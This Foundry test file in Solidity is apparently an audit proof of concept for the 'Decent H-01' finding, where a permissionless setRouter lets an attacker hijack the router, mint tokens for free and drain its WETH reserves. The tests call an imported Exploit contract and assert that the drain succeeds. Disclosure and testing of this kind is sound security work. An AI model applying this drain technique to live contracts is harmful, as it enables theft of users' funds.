// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./30559-h-01-anyone-can-update-the-address-of-the-router-in-the-dcnt.sol";

/* Decent H-01 — permissionless setRouter drains WETH reserves via free mint + redeem */
contract PoC_30559 is Test {
    function test_anyone_can_set_router_and_drain() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.dcnt().router(), address(e.attacker()));
        assertEq(e.weth().balanceOf(address(e.attacker())), e.LP_AMOUNT());
        assertEq(e.weth().balanceOf(address(e.router())), 0);
    }

    function test_control_mint_reverts_when_not_router() public {
        Exploit e = new Exploit();
        // Before hijack, only the legitimate router can mint.
        DcntEth d = e.dcnt();
        vm.expectRevert();
        d.mint(address(this), 1 ether);
    }
}
